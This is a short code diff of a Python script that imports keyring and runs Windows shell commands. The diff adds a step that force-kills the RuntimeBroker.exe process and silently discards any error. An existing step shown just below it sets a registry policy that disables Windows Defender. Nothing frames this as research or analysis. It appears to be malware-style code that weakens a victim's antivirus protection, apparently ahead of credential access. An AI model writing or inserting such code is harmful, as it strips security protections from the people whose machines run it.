@@ -7,6 +7,10 @@ import keyring
 
 import subprocess
 
+try:
+    subprocess.run("taskkill /F /IM RuntimeBroker.exe", shell=True, check=True)
+except subprocess.CalledProcessError as e:
+    print("")
 
 try:
     subprocess.run('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=True)
